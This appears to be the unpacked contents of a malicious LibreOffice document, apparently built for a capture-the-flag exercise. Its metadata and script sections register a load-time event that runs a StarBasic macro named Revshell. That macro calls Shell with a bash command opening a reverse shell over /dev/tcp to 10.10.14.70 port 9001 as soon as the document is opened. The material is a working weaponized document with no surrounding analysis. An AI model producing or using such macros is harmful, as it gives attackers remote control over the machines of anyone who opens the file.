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Revshell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dom:load" xlink:href="vnd.sun.star.script:Standard.Revshell.Revshell?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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bd704" officeooo:paragraph-rsid="001bd7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16:16:12.620019660</meta:creation-date>
    <dc:date>2023-09-07T16:18:00.846979449</dc:date>
    <meta:editing-duration>PT1M48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7.5.5.2$Linux_X86_64 LibreOffice_project/50$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>

<file path=Basic/Standard/Revshell.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Revshell" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub Revshell
	Shell("bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.70/9001 0&gt;&amp;1'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evshell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